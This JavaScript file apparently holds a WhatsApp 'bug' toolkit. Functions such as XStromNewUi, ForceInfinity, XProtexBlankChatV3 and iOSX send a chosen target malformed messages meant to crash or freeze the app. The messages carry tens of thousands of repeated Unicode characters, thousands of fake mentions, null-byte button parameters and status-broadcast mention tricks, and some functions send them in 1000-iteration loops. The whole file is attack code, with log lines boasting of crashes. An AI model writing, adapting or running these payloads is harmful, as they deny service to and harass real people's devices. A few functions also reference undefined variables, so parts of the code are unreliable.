async function LocationDelayCore(x) {
  await sock.sendMessage(x, {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "IMPOSSIBLE",
            locationMessage: {
              degreesLatitude: 0,
              degreesLongtitude: 0,
            },
            hasMediaAttachment: true,
          },
          contextInfo: {
            participant: x,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1999 },
                () =>
                "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
          },
          body: {
            text: "i am tired...",
          },
          nativeFlowMessage: {
            messageParamsJson: "{}",
          },
        },
      },
    },
  }, { participant: { jid: x } });
}
async function XStromNewUi(target) {
  try {
   const msg = {
     viewOnceMessage: {
       message: {
         interactiveMessage: {
           contextInfo: {
             participant: target,
             mentionedJid: [
               "0@s.whatsapp.net",
                ...Array.from(
               { length: 1900 },
               () =>
             "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        remoteJid: "X",
        participant: "0@s.whatsapp.net",
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
           paymentInviteMessage: {
             serviceType: 3,
             expiryTimestamp: Date.now() + 1814400000
               },
             },
             externalAdReply: {
               title: "☀️",
               body: "🩸",
               mediaType: 1,
             renderLargerThumbnail: false,
             },
           },
           body: {
             text: "Cikiwir" +
              "ោ៝".repeat(25000) +
              "ꦾ".repeat(25000) +
              "@5".repeat(50000),
           },
           nativeFlowMessage: {
             messageParamJson: "{".repeat(25000),
           },
           stickerMessage: {
             url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
             fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
             fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
             mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
             mimetype: "image/webp",
             height: 9999,
             width: 9999,
             directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
             fileLength: 12260,
             mediaKeyTimestamp: "1743832131",
             isAnimated: false,
             stickerSentTs: "X",
             isAvatar: false,
             isAiSticker: false,
             isLottie: false,
           },
         },
       },
     },
   };
   
   await sock.relayMessage(target, msg, {
     messageId: null,
     participant: { jid: target },
   });
   console.log(chalk.bold.blue(`Succes Sending Bug NewUi By Cikiwir To ${target}`));
 } catch (err) {
   console.log("GAGAL MENGIRIM BUG STICKER", err);
   throw err;
  }
}
async function XStromXCallVersion2(target) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: { 
              text: `⌁⃰𝙓𝙎𝙩𝙧𝙤𝙢𝙁𝙡𝙤𝙬𝙚𝙧ཀ${"꧀".repeat(2500)}.com - _ #`
            },
            nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
              buttons: [
                {
                  name: "cta_call",
                  buttonParamsJson: "",
                },
                {
                  name: "payment_info",
                  buttonParamJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                 },
               {
                 name: "cta_url",
                 buttonParamsJson: "",
               },
                {
                  name: "galaxy_message",
                  buttonParamsJson: `{ icon: 'DOCUMENT' }`,
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "{ 'consencutive': true }",
                },
              ],
            },
            extendedTextMessage: {
            text: "ꦾ".repeat(20000) + "@1".repeat(20000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation:
                  "⌁⃰𝙓𝙎𝙩𝙧𝙤𝙢𝙁𝙡𝙤𝙬𝙚𝙧ཀ" +
                  "ꦾ࣯࣯".repeat(50000) +
                  "@1".repeat(20000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
            },
          },
        },
      },
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  console.log(chalk.red(`Succes Sending cikiwir bugs To ${target}`));
}
async function ForceInfinity(target) {
  try {
    let message = {
      interactiveMessage: {
        body: { text: "Gua suka permen" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(
                0x2710
              )},\"payment_timestamp\":null,\"share_payment_status\":true}`,
            },
          ],
          messageParamsJson: "{}",
        },
      },
    };

    const msg = generateWAMessageFromContent(target, message, {});

    await sock.relayMessage(target, msg.message, {
      additionalNodes: [
        { tag: "biz", attrs: { native_flow_name: "payment_method" } },
      ],
      messageId: msg.key.id,
      participant: { jid: target },
      userJid: target,
    });

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: { native_flow_name: "payment_method" },
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined,
                },
              ],
            },
          ],
        },
      ],
    });

    console.log("Cikiwir Crash Android");
  } catch (err) {
    console.error(calik.red.bold(err));
  }
}
async function XProtexBlankChatV3(target) {
  const XProtex = '_*~@2~*_\n'.repeat(10500);
  const Private = 'ោ៝'.repeat(10000);
   
  const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "1@newsletter",
      newsletterName: "💣⃟𝑫͜𝑹͙͢꙰͙𝑨͢𝑮͜𝑶͢𝑵͜" + "ោ៝".repeat(20000),
      caption: "💣⃟𝑫͜𝑹͙͢꙰͙𝑨͢𝑮͜𝑶͢𝑵͜" + Private + "ោ៝".repeat(20000),
      inviteExpiration: "999999999",
    },
  };

  await sock.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null,
  });

  const messageCrash2 = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
              contextInfo: {
              stanzaId: sock.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "💣⃟𝑫͜𝑹͙͢꙰͙𝑨͢𝑮͜𝑶͢𝑵͜",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: ""
                    },
                },
              },
            body: {
              text: "Hi I'm Cikiwir!!" + "ꦾ".repeat(2000)
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "cta_url",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "cta_call",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "cta_reminder",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "cta_cancel_reminder",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "address_message",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "send_location",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
              ],
            },
          },
        },
      },
    };
    await sock.relayMessage(target, messageCrash2, {
      participant: { jid: target },
    });
console.log(chalk.red(`BUG DIKIRIM KE => ${target}`));
      }
async function XStromDelayVisible(x) {
  for (let i = 0; i < 1000; i++) {
    await sock.relayMessage(x, {
      ephemeralMessage: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              participant: x,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
               { length: 1000 * 40 },
                 () =>
               "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                ),
              ],
            },
            body: {
              text: "HAAHAH DELAY YA CUNG",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              buttonParamsJson: "\u0000",
              version: 2,
            },
          },
        },
      },
    }, {
      participant: { jid: x },
      messageId: null,
    });
    console.log(chalk.red(`Succes Sending Bug By Cikiwir`, x));
  }
}
async function XStromDelayBeta(x) {
  for (let i = 0; i < 1000; i++) {
    console.log(chalk.red(`Succes Sending Bug Cikiwir`));
    const msg = await generateWAMessageFromContent(x, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              participant: x,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
               { length: 1000 * 40 },
                 () =>
               "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                ),
              ],
            },
            body: {
              text: "@LimvzxTyz Here Bro!!",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_message",
              paramsJson: "\x10".repeat(1000000),
              version: 2
            },
          },
        },
      },
    }, 
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
      Math.floor(Math.random() * 16777215)
                    .toString(16)
      .padStart(6, "99999999"),
    },
  );
  
  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [x],
    additionalNodes: [
      {
        tag: "meta",
            attrs: {},
            content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: x },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  await new Promise((resolve) => setTimeout(resolve, 250));
 }
}
async function csnith(target) {
      try {
  const payload = {
    ephemeralMessage: {
        message: {
          locationMessage: {
            degreesLatitude: -9.09999262999,
            degreesLongitude: 199.99963118999,
            jpegThumbnail: null,
            name:
              "🍻⃟༑⌁⃰𝒆́𝑺𝒏𝒊𝒕𝒉 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧ཀ͜͡🍻" +
              "ꦽ".repeat(45000),
            address: "🍻⃟༑⌁⃰𝒆́𝑺𝒏𝒊𝒕𝒉 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧ཀ͜͡🍻",
            url:
              "https://fvck.snith.🩸" +
              "؂ن؃".repeat(100000) +
              ".com",
            contextInfo: {
              externalAdReply: {
                quotedAd: {
                  advertiserName: " ؂ن؃".repeat(10000),
                  mediaType: "IMAGE",
                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                  caption: " X ",
                },
                placeholderKey: {
                  remoteJid: "0@s.whatsapp.net",
                  fromMe: false,
                  id: "ABCDEF1234567890",
                },
              },
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000,
                },
                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid:
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net",
                  creatorName: "Bot",
                },
              },
            },
          },
        },
      },
  };

  const message = await (async () => {
    try {
      return generateWAMessageFromContent(
        isTarget,
        payload,
        {}
      );
    } catch (e) {
      console.error("Error generating message payload:", e);
    }
  })();

  if (message) {
    await sock.relayMessage(
      isTarget,
      message.message,
      { messageId: message.key.id }
    );
  }
} catch (e) {
    console.error("❌ Error kirim message:", e);
  }
}

async function desnith(target) {
try {
    let sxo = generateWAMessageFromContent(obejctive, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "🍻⃟༑⌁⃰𝒆́𝑺𝒏𝒊𝒕𝒉 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧ཀ͜͡🍻",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });
   let sXoMessage = {
     extendedTextMessage: {
       text: "ꦾ".repeat(300000),
         contextInfo: {
           participant: obejctive,
             mentionedJid: [
               "0@s.whatsapp.net",
                  ...Array.from(
                  { length: 1900 },
                   () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                 )
               ]
             }
           }
         };

     const xso = generateWAMessageFromContent(obejctive, sXoMessage, {});
      await sock.relayMessage("status@broadcast", xso.message, {
        messageId: xso.key.id,
        statusJidList: [obejctive],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: obejctive }, content: undefined }
                ]
            }]
        }]
    });
     if (mention) {
        await sock.relayMessage(obejctive, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: xso.key.id,
                        type: 25,
                    },
                },
            },
        }, {});
    }
    await sock.relayMessage("status@broadcast", sxo.message, {
        messageId: sxo.key.id,
        statusJidList: [obejctive],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: obejctive }, content: undefined }
                ]
            }]
        }]
    });
    if (mention) {
        await sock.relayMessage(obejctive, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: sxo.key.id,
                        type: 25,
                    },
                },
            },
        }, {});
    }
} catch (error) {
  console.error("Error di :", error, "Bodooo");
 }
}
async function iOSX(sock, X) {
   let msgx = generateWAMessageFromContent(X, proto.Message.fromObject({
    viewOnceMessage: {
     message: {
      interactiveMessage: {
       header: {
        title: "",
        locationMessage: {
          degreesLatitude: -9.09999262999,
          degreesLongitude: 199.99963118999,
          jpegThumbnail: null,
          name: "‼️⃟ ༚ 𝕏𝕽𝖆𝖑𝖉𝖟 ¿?" + "𑇂𑆵𑆴𑆿".repeat(12000),
          address: "‼️⃟ ༚ 𝕏𝕽𝖆𝖑𝖉𝖟 ¿?" + "𑇂𑆵𑆴𑆿".repeat(12000),
          merchantUrl: `https://whatsapp-ios.${"𑇂𑆵𑆴𑆿".repeat(12000)}.pnx.id/`,
          inviteLinkGroupTypeV2: "DEFAULT",
        },
        hasMediaAttachment: true
       },
       body: {
        text: "‼️⃟ ༚ 𝕏𝕽𝖆𝖑𝖉𝖟 ¿?" + "𑇂𑆵𑆴𑆿".repeat(3000),
       },
       nativeFlowMessage: {
        messageParamsJson: "{}",
        buttons: [
          {
            name: "payment_method",
            buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(0x2710)},\"payment_timestamp\":null,\"share_payment_status\":true}`,
          },         
        ],
       },
       carouselMessage: {}
      }
     }
    }
   }), {});

  await sock.relayMessage("status@broadcast", msgx.message, {
    messageId: msgx.key.id,
    statusJidList: [X],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: X },
              },
            ],
          },
        ],
      },
    ],
  });
    
  let msgxx = generateWAMessageFromContent(X, proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              orderMessage: {
                orderId: "0",
                itemCount: -999999,
                status: "SUCCESS",
                surface: "BUFFERS",
                orderDescription: "‼️⃟ ༚ 𝕏𝕽𝖆𝖑𝖉𝖟 ¿?" + "𑇂𑆵𑆴𑆿".repeat(12000),
                message: "‼️⃟ ༚ 𝕏𝕽𝖆𝖑𝖉𝖟 ¿?" + "𑇂𑆵𑆴𑆿".repeat(12000),
                orderTitle: "‼️⃟ ༚ 𝕏𝕽𝖆𝖑𝖉𝖟 ¿?",
                token: "92298382919191",
                thumbnail: { 
                  url: "https://files.catbox.moe/ykvioj.jpg" 
                },
                messageVersion: 1,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: "",
            },
            nativeFlowMessage: {
              name: "galaxy_message",
              messageParamsJson: "{\"icon\":\"REVIEW\",\"flow_cta\":\"\\u0000\",\"flow_message_version\":\"3\"}",
            },
          },
        },
      },
    }), {});
    
  await sock.relayMessage("status@broadcast", msgxx.message, {
    messageId: msgxx.key.id,
    statusJidList: [X],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: X },
              },
            ],
          },
        ],
      },
    ],
  });
};